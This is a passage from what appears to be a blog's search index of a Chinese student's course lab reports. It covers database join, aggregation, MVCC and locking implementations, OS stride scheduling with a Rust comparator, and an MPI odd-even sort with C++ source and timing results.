title="设计思路"></a>设计思路</h4><p>使用 <code>bool</code> 数组标记循环中外表与内表中的每条记录的连接情况. 循环完毕后, 从 <code>NestedLoopJoinOperator</code> 中获取连接条件, 对于外连接情形分别使用 <code>null</code> 补全未被连接的记录.</p><h4 id="新增代码"><a href="#新增代码" class="headerlink" title="新增代码"></a>新增代码</h4><p>文件 <code>src/executors/nested_loop_join_executor.cpp</code>.</p><h4 id="测例展示"><a href="#测例展示" class="headerlink" title="测例展示"></a>测例展示</h4><p>测试用例位于 <code>test/lab4/50-nested-loop-outer-join.test</code>, 设置上完全复用了 <code>test/lab4/30-nested-loop-join.test</code>, 只修改连接条件为 <code>left join</code> / <code>right join</code> / <code>full join</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">make</span> debug <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> lab4/50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="内存哈希连接"><a href="#内存哈希连接" class="headerlink" title="内存哈希连接"></a>内存哈希连接</h3><h4 id="设计思路-1"><a href="#设计思路-1" class="headerlink" title="设计思路"></a>设计思路</h4><p>在 <code>src/executors/hash_join_executor.h</code> 中添加成员变量:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class HashJoinExecutor : public Executor { private:  std::shared_ptr&lt;const HashJoinOperator&gt; plan_;  std::hash&lt;Value&gt; hasher;  std::unordered_map&lt;size_t, std::vector&lt;std::shared_ptr&lt;Record&gt;&gt;&gt; first_records_;  std::unordered_map&lt;size_t, std::vector&lt;std::shared_ptr&lt;Record&gt;&gt;&gt; second_records_;  std::vector&lt;std::shared_ptr&lt;Record&gt;&gt; records_;  bool joined_ = false;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>划分阶段</strong>: 按 <code>hasher</code> 的哈希值对两表的记录进行分组, 哈希值相同的记录被划分到 <code>unordered_map</code> 的一个桶里进行连接.</p><p><strong>探查阶段</strong>: 对记录进行嵌套循环连接, 并输出到 <code>records_</code> 中.</p><h4 id="新增代码-1"><a href="#新增代码-1" class="headerlink" title="新增代码"></a>新增代码</h4><p>文件 <code>src/executors/hash_join_executor.cpp</code>.</p><h4 id="测例展示-1"><a href="#测例展示-1" class="headerlink" title="测例展示"></a>测例展示</h4><p>测试用例位于 <code>test/lab4/60-hash-loop-join.test</code>, 完全复用了 <code>test/lab4/30-nested-loop-join.test</code>, 只修改连接设置为 <code>hash</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">make</span> debug <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> lab4/60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="分组聚合算子"><a href="#分组聚合算子" class="headerlink" title="分组聚合算子"></a>分组聚合算子</h3><h4 id="设计思路-2"><a href="#设计思路-2" class="headerlink" title="设计思路"></a>设计思路</h4><p>首先对记录进行哈希分组:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/* src/executors/aggregate_executor.cpp */while (auto record = children_[0]-&gt;Next()) {  uint64_t hash = 0;  for (auto &amp;group_by : plan_-&gt;group_bys_) {    hash *= 31;    hash += hasher(group_by-&gt;Evaluate(record));    auto col_value = dynamic_cast&lt;ColumnValue *&gt;(group_by.get());  }  hash %= 100000;  hash_records_[hash].push_back(record);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在分组后遍历组内的每条记录以实现 <code>min</code>, <code>max</code>, <code>sum</code>, <code>avg</code> 聚合函数, 依据记录字段是否为空实现 <code>count</code> 聚合函数, <code>count(*)</code> 聚合函数直接返回记录总数.</p><h4 id="新增代码-2"><a href="#新增代码-2" class="headerlink" title="新增代码"></a>新增代码</h4><p>文件 <code>src/executors/aggregate_executor.cpp</code>.</p><h4 id="测例展示-2"><a href="#测例展示-2" class="headerlink" title="测例展示"></a>测例展示</h4><p>测试用例位于 <code>test/lab4/70-aggregate.test</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">make</span> debug <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> lab4/70<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分别进行了如下测试:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span> room<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">from</span> test_group_by <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">,</span> room<span class="token keyword">select</span> id<span class="token punctuation">,</span> room<span class="token punctuation">,</span> <span class="token function">sum</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">from</span> test_group_by <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">,</span> room<span class="token keyword">select</span> id<span class="token punctuation">,</span> room<span class="token punctuation">,</span> <span class="token function">avg</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">from</span> test_group_by <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">,</span> room<span class="token keyword">select</span> id<span class="token punctuation">,</span> room<span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span>score<span class="token punctuation">)</span> <span class="token keyword">from</span> test_group_by <span class="token keyword">group</span> <span class="token keyword">by</span> id<span class="token punctuation">,</span> room<span class="token comment">------------------------------------------------------------------</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">from</span> test_count<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> id<span class="token punctuation">)</span> <span class="token keyword">from</span> test_count<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> test_count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实验耗时"><a href="#实验耗时" class="headerlink" title="实验耗时"></a>实验耗时</h2><ol><li>基础功能<ul><li>Limit 算子: 0.5h.</li><li>排序算子: 0.5h.</li><li>嵌套循环连接算子: 0.5h.</li><li>归并连接算子: 1h.</li></ul></li><li>高级功能<ul><li>外连接: 2.5h.</li><li>内存哈希连接与分组聚合算子: 4h.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 Lab 3</title>
      <link href="/2024/05/04/cao-zuo-xi-tong-lab-3/"/>
      <url>/2024/05/04/cao-zuo-xi-tong-lab-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-3"><a href="#Lab-3" class="headerlink" title="Lab 3"></a>Lab 3</h1><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="sys-spawn"><a href="#sys-spawn" class="headerlink" title="sys_spawn"></a><code>sys_spawn</code></h3><blockquote><p>参考 <code>sys_fork</code> 以及 <code>sys_exec</code> 的实现.</p></blockquote><ol><li>通过 <code>MemorySet::from_elf</code> 解析 <code>elf</code> 文件得到 <code>memory_set</code>, <code>user_sp</code>, <code>entry_point</code>, 查询得到 <code>trap_cx_ppn</code>.</li><li>在内核空间进行 <code>pid_handle</code> 与 <code>kernel_stack</code> 分配, 并参考 <code>fork</code> 的实现新建 <code>TaskControlBlock</code>.</li><li>将新建的 <code>TaskControlBlock</code> 设置为当前 <code>TaskControlBlock</code> 的子进程.</li><li>修改新建 <code>TaskControlBlock</code> 的 <code>trap_cx</code> 的值.</li></ol><h3 id="stride-调度算法"><a href="#stride-调度算法" class="headerlink" title="stride 调度算法"></a>stride 调度算法</h3><ol><li>设置进程初始 <code>stride</code> 为 0, 初始 <code>priority</code> 为 16.</li><li><code>TaskManager::add</code> 将 <code>task</code> 加入队列时, 按 <code>stride</code> 递增顺序选择插入位置.</li><li><code>TaskManager::fetch</code> 获得队首 <code>task</code> 时, 按 <code>priority</code> 更新其 <code>stride</code> 值.</li></ol><h2 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h2><ol><li><p><strong>stride 算法原理非常简单, 但有一个比较大的问题. 例如两个 <code>pass = 10</code> 的进程, 使用 8bit 无符号整型储存 stride, <code>p1.stride = 255</code>, <code>p2.stride = 250</code>, 在 p2 执行一个时间片后, 理论上下一次应该 p1 执行.</strong></p><ol><li><p><strong>实际情况是轮到 p1 执行吗? 为什么?</strong></p><p> 答: 不是, p2 执行并更新 stride 后, 溢出了 8bit 无符号整型的表示范围,  <code>p2.stride = 4</code>, 因此下一次还是 p2 执行.</p></li></ol></li></ol><pre><code>**之前要求进程优先级 $\ge 2$ 其实就是为了解决这个问题. 可以证明, 在不考虑溢出的情况下, 在进程优先级全部 $\ge 2$ 的情况下, 如果严格按照算法执行, 那么 `STRIDE_MAX – STRIDE_MIN` $\le$ `BigStride / 2`.**2. **为什么? 尝试简单说明.**    答: 进程优先级 $\ge 2$ 的情况下, stride 的更新值至多为 `BigStride / 2`. 若某次 stride 更新后 `STRIDE_MAX – STRIDE_MIN &gt; BigStride / 2`, 说明在 stride 更新前被挑选的进程满足  `STRIDE – STRIDE_MIN &gt; 0`, 即并未选择 stride 最小的进程进行调度, 与算法的选取原则矛盾.3. **已知以上结论, 考虑溢出的情况下, 可以为 stride 设计特别的比较器, 让 `BinaryHeap&lt;Stride&gt;` 的 `pop` 方法能返回真正最小的 stride. 补全下列代码中的 `partial_cmp` 函数, 假设两个 stride 永远不会相等.**    <pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> cmp<span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">-</span> other<span class="token number">.0</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> cmp <span class="token operator">&gt;</span> <span class="token class-name">BigStride</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token punctuation">{</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">bool</span> <span class="token punctuation">{</span>        <span class="token boolean">false</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库专题训练 Lab 3</title>
      <link href="/2024/04/23/shu-ju-ku-zhuan-ti-xun-lian-lab-3/"/>
      <url>/2024/04/23/shu-ju-ku-zhuan-ti-xun-lian-lab-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-3-多版本并发控制"><a href="#Lab-3-多版本并发控制" class="headerlink" title="Lab 3 多版本并发控制"></a>Lab 3 多版本并发控制</h1><h2 id="记录可见性的判断方法"><a href="#记录可见性的判断方法" class="headerlink" title="记录可见性的判断方法"></a>记录可见性的判断方法</h2><p>见 <code>src/table/table_scan.cpp - IsVisible()</code> 中的具体实现.</p><p><strong>可重复读</strong>隔离级别:</p><ul><li>记录<strong>被删除</strong>:<ul><li>默认可见;</li><li>如果对应的事务在当前事务之后, 则记录可见;</li><li>如果对应的事务不是活跃事务, 则记录不可见.</li></ul></li><li>记录<strong>未被删除</strong>:<ul><li>默认可见;</li><li>如果对应的事务是当前事务, 则记录不可见;</li><li>如果对应的事务在当前事务之后, 则记录不可见;</li><li>如果对应的事务是活跃事务, 则记录不可见.</li></ul></li></ul><p><strong>读已提交/串行化</strong>隔离级别:</p><ul><li>记录<strong>被删除</strong>:<ul><li>默认可见;</li><li>如果对应的事务是当前事务, 则记录不可见;</li><li>如果对应的事务不是活跃事务, 则记录不可见.</li></ul></li><li>记录<strong>未被删除</strong>:<ul><li>默认可见;</li><li>如果对应的事务是当前事务, 则记录不可见;</li><li>如果对应的事务是活跃事务但不是当前事务, 则记录不可见.</li></ul></li></ul><h2 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h2><h3 id="解决万圣节问题"><a href="#解决万圣节问题" class="headerlink" title="解决万圣节问题"></a>解决万圣节问题</h3><p><strong>添加记录头信息</strong>见 <code>src/table/table_page.cpp</code>.</p><ul><li>通过 <code>record-&gt;SetCid()</code>, <code>record-&gt;SetXmin()</code>, <code>record-&gt;SetXmax()</code> 设置相应的记录头信息.</li></ul><p><strong>修改可见性判断条件</strong>见 <code>src/table/table_scan.cpp</code>.</p><ul><li>满足 <code>record-&gt;GetXmax() == NULL_XID</code> 且 <code>record-&gt;GetXmin() != xid || record-&gt;GetCid() != cid</code> 的记录是可见的, 即记录未被删除且不由当前命令设置.</li></ul><h3 id="实现可重复读隔离-实现读已提交隔离"><a href="#实现可重复读隔离-实现读已提交隔离" class="headerlink" title="实现可重复读隔离 / 实现读已提交隔离"></a>实现可重复读隔离 / 实现读已提交隔离</h3><p><strong>设置活跃事务集合</strong>见 <code>src/executors/seqscan_executor.cpp</code>.</p><ul><li>分别通过 <code>GetSnapshot()</code> 和 <code>GetActiveTransactions()</code> 获取事务开始时的活跃事务集合以及即时的活跃事务集合.</li></ul><p><strong>修改可见性判断条件</strong>见 <code>src/table/table_scan.cpp</code>.</p><ul><li>分已删除记录和未删除记录进行处理, 见报告第一节.</li></ul><h3 id="强两阶段锁"><a href="#强两阶段锁" class="headerlink" title="强两阶段锁"></a>强两阶段锁</h3><p><strong>实现锁管理器 LockManager</strong> 见 <code>src/transaction/lock_manager.cpp</code>.</p><ul><li><p>使用 <code>std::vector</code> 保存表锁和数据行锁信息.</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct TableLock {  LockType lock_type;  xid_t xid;  oid_t oid;};struct RowLock {  LockType lock_type;  xid_t xid;  oid_t oid;  Rid rid;};class LockManager {  ...  private:  std::vector&lt;TableLock&gt; table_locks_;  std::vector&lt;RowLock&gt; row_locks_;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>LockTable()</code> 与 <code>LockRow()</code> 先检查是否存在其他事务加的锁, 以及锁的类型相容性, 再检查本事务是否持有锁, 并升级锁的类型, 最后成功获取锁.</p></li><li><p><code>Compatible()</code> 实现参考 PPT 给出的意向锁相容性矩阵.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408011832724.png" alt=""></p></li><li><p><code>Upgrade()</code> 实现如下, 需要注意的是特殊判断 SIX 锁的获取.</p>  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LockType LockManager::Upgrade(LockType self, LockType other) const {  if (self == other) {    return self;  }  if (self == LockType::S &amp;&amp; other == LockType::IX) {    return LockType::SIX;  }  return other;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>为修改操作加锁</strong>见 <code>src/executors/*</code>.</p><ul><li>普通 <code>select</code> 语句对表加 IS 锁; 数据修改操作对表加 IX 锁, 对修改的数据行加 X 锁.</li></ul><h3 id="实现可串行化隔离"><a href="#实现可串行化隔离" class="headerlink" title="实现可串行化隔离"></a>实现可串行化隔离</h3><p><strong>实现 select for update/share 加锁</strong>见 <code>src/executors/lock_rows_executor.cpp</code>.</p><ul><li>根据 <code>plan_</code> 的 <code>lock type</code>, 对表加 IS/ IX 锁, 对相应数据行加 S/X 锁.</li></ul><p><strong>设置活跃事务集合</strong>见 <code>src/executors/seqscan_executor.cpp</code>.</p><ul><li>完全与<strong>读已提交隔离</strong>相同.</li></ul><p><strong>修改可见性判断条件</strong>见 <code>src/table/table_scan.cpp</code>.</p><ul><li>完全与<strong>读已提交隔离</strong>相同.</li></ul><h2 id="实验耗时"><a href="#实验耗时" class="headerlink" title="实验耗时"></a>实验耗时</h2><ol><li>基础功能<ul><li>解决万圣节问题: 1h.</li><li>通过多版本并发控制实现可重复读隔离: 0.5h.</li><li>实现读已提交隔离: 1h.</li><li>强两阶段锁: 1h.</li><li>通过多版本两阶段锁实现可串行化隔离: 0.5h.</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高性能计算导论 Lab 1</title>
      <link href="/2024/04/17/gao-xing-neng-ji-suan-dao-lun-lab-1/"/>
      <url>/2024/04/17/gao-xing-neng-ji-suan-dao-lun-lab-1/</url>
      
        <content type="html"><![CDATA[<h1 id="奇偶排序-大作业-实验报告"><a href="#奇偶排序-大作业-实验报告" class="headerlink" title="奇偶排序 大作业 实验报告"></a>奇偶排序 大作业 实验报告</h1><p></p><center>    计 13 班 程思翔 2021010761</center><p></p><h2 id="sort-源代码"><a href="#sort-源代码" class="headerlink" title="sort 源代码"></a><code>sort</code> 源代码</h2><p>实现说明以代码注释的形式给出.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">const int BIT = 8;const int BYTE_CNT = 4;const int MAX_BYTE = 256;const int MAX_BLOCK_LEN = 512;// 基数排序void better_sort(unsigned *beg, unsigned *end) {    int len = end - beg;    // 统计每个字节出现的次数    int cnt[MAX_BYTE];    // 在排序过程中暂存数据    unsigned *tmp = new unsigned[len];    // 从低位到高位依次取出一个字节进行排序    for (int p = 0; p &lt; BYTE_CNT; p++) {        memset(cnt, 0, sizeof(cnt));        // 对每个元素的当前字节进行计数        for (int q = 0; q &lt; len; q++) {            // 取出第 p 个字节            cnt[(beg[q] &gt;&gt; (p * BIT)) &amp; (MAX_BYTE - 1)]++;        }        // 每个元素表示小于或等于该索引值的元素的数量        for (int r = 1; r &lt; MAX_BYTE; r++) {            cnt[r] += cnt[r - 1];        }        // 在原始数组 beg 和临时数组 tmp 之间进行排序        if (p % 2 == 1) {            for (int s = len - 1; s &gt;= 0; s--) {                beg[--cnt[(tmp[s] &gt;&gt; (p * BIT)) &amp; (MAX_BYTE - 1)]] = tmp[s];            }        }        else {            for (int s = len - 1; s &gt;= 0; s--) {                tmp[--cnt[(beg[s] &gt;&gt; (p * BIT)) &amp; (MAX_BYTE - 1)]] = beg[s];            }        }    }    // 排序后数据从 tmp 复制回 beg    memcpy(tmp, beg, sizeof(unsigned) * len);    // 数组的起始位置    int start = len - 1;    // 当前遍历的位置    int cur = len - 1;    // 将 tmp 中所有负数按顺序放到 beg 的末尾    while ((tmp[cur] &amp; (0x1 &lt;&lt; 31)) &amp;&amp; (cur &gt;= 0)) {        beg[start - cur] = tmp[cur];        cur--;    }    // 将 tmp 中所有非负数复制到 beg 的前面    memcpy(beg + start - cur, tmp, sizeof(unsigned) * (cur + 1));    delete[] tmp;    return;}void Worker::sort() {    // 如果当前进程处于边界位置，直接返回即可    if (out_of_range) {        return;    }    // 根据 block_len 大小使用不同排序算法    if (block_len &gt; MAX_BLOCK_LEN) {        unsigned *n_data = (unsigned *)data;        better_sort(n_data, n_data + block_len);    }    else {        std::sort(data, data + block_len);    }    // 当前进程是否处于失配位置    bool proc_mismatch[2];    proc_mismatch[0] = (nprocs % 2 == 1 &amp;&amp; last_rank) ? 1 : 0;    proc_mismatch[1] = ((nprocs % 2 == 0 &amp;&amp; last_rank) || rank == 0) ? 1 : 0;    // 接收数据、归并结果缓冲区    size_t block_size = ceiling(n, nprocs);    float *n_data = new float[block_size];    float *buffer = new float[block_len];    // 当前进程在进程组中为左进程还是右进程    bool n_proc_direc[2];    n_proc_direc[0] = (rank + 1) % 2;    n_proc_direc[1] = n_proc_direc[0] ^ 1;    // 相邻进程的进程号    int n_proc_idx[2];    n_proc_idx[0] = rank + 2 * n_proc_direc[0] - 1;    n_proc_idx[1] = 2 * rank - n_proc_idx[0];    // 相邻进程的数据长度    int n_block_len[2];    n_block_len[0] = std::min(block_size, n - block_size * n_proc_idx[0]);    n_block_len[1] = std::min(block_size, n - block_size * n_proc_idx[1]);    // MPI 请求    MPI_Request req_send;    MPI_Request req_recv;    // 临时变量    int s, p, q, r;    int stage = -1;    // 进行 nprocs 轮循环，一定能实现稳定排序    while (++stage &lt; nprocs) {        // 当前轮次的奇偶性        s = stage % 2;        // 如果当前进程处于失配位置，直接跳过        if (proc_mismatch[s]) {            continue;        }        // 向相邻进程发送数据        MPI_Isend(data, block_len, MPI_FLOAT, n_proc_idx[s], 0, MPI_COMM_WORLD, &amp;req_send);        MPI_Irecv(n_data, n_block_len[s], MPI_FLOAT, n_proc_idx[s], 0, MPI_COMM_WORLD, &amp;req_recv);        MPI_Wait(&amp;req_recv, nullptr);        // 当前为左进程        if (n_proc_direc[s]) {            // 需要进行归并排序            if (data[block_len - 1] &gt; n_data[0]) {                p = 0;                q = 0;                r = 0;                // 从两个数组的开头开始，选取较小的元素放入 buffer 中                while (r != (int)block_len) {                    if (p &lt; n_block_len[s] &amp;&amp; (q &gt;= (int)block_len || n_data[p] &lt; data[q])) {                        buffer[r++] = n_data[p++];                    } else if (q &lt; (int)block_len) {                        buffer[r++] = data[q++];                    }                }                     // 交换 data 和 buffer                std::swap(data, buffer);            }        }        // 当前为右进程        else {            // 需要进行归并排序            if (data[0] &lt; n_data[n_block_len[s] - 1]) {                p = n_block_len[s] - 1;                q = block_len - 1;                r = block_len - 1;                // 从两个数组的开头开始，选取较小的元素放入 buffer 中                while (r != -1) {                    if (p &gt;= 0 &amp;&amp; (q &lt; 0 || n_data[p] &gt; data[q])) {                        buffer[r--] = n_data[p--];                    } else if (q &gt;= 0) {                        buffer[r--] = data[q--];                    }                }                // 交换 data 和 buffer                std::swap(data, buffer);            }        }        // 尽可能将通信时间与计算时间重叠        MPI_Wait(&amp;req_send, nullptr);    }    delete[] n_data;    delete[] buffer;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="基础排序算法"><a href="#基础排序算法" class="headerlink" title="基础排序算法"></a>基础排序算法</h3><p>进程内 <code>block_len</code> 较小时, 使用 <code>std:: sort</code> 进行排序; 进程内 <code>block_len</code> 较大时, 使用基数排序, 对大规模数据效果较好.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (block_len &gt; MAX_BLOCK_LEN) {    unsigned *n_data = (unsigned *)data;    better_sort(n_data, n_data + block_len);}else {    std::sort(data, data + block_len);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="稳定性判断"><a href="#稳定性判断" class="headerlink" title="稳定性判断"></a>稳定性判断</h3><p>奇偶排序是稳定的, 只需要循环 <code>nprocs</code> 轮, 得到的进程间数据必然是有序的, 省略了对全局有序性的判断时间.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">while (++stage &lt; nprocs) {    s = stage % 2;...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>让进程对的两个进程互相向对方发送数据, 进行归并排序, 在时间上实现重叠; 相比于设置主进程归并且分发结果到子进程, 减少了进程间通信时间成本.</p><h3 id="计算、通信时间重叠"><a href="#计算、通信时间重叠" class="headerlink" title="计算、通信时间重叠"></a>计算、通信时间重叠</h3><p>进程对的两个进程进行归并排序时, 使用非阻塞通信, 将计算时间和通信时间尽可能地重叠, 通过点对点异步通信实现.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">MPI_Isend(data, block_len, MPI_FLOAT, n_proc_idx[s], 0, MPI_COMM_WORLD, &amp;req_send);MPI_Irecv(n_data, n_block_len[s], MPI_FLOAT, n_proc_idx[s], 0, MPI_COMM_WORLD, &amp;req_recv);MPI_Wait(&amp;req_recv, nullptr);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><div class="table-container"><table><thead><tr><th>$N\times P$</th><th>1 $\times$ 1</th><th>1 $\times$ 2</th><th>1 $\times$ 4</th><th>1 $\times$ 8</th><th>1 $\times$ 16</th><th>2 $\times$ 16</th></tr></thead><tbody><tr><td>耗费时间/ms</td><td>3443.300</td><td>2027.988</td><td>1311.689</td><td>912.484</td><td>730.631</td><td>644.694</td></tr><tr><td>加速比</td><td>1</td><td>1.698</td><td>2.625</td><td>3.774</td><td>4.713</td><td>5.341</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> HPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> High Performance Computing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库专题训练 Lab 2</title>
      <link href="/2024/04/14/shu-ju-ku-zhuan-ti-xun-lian-lab-2/"/>
      <url>/2024/04/14/shu-ju-ku-zhuan-ti-xun-lian-lab-2/</url>
      
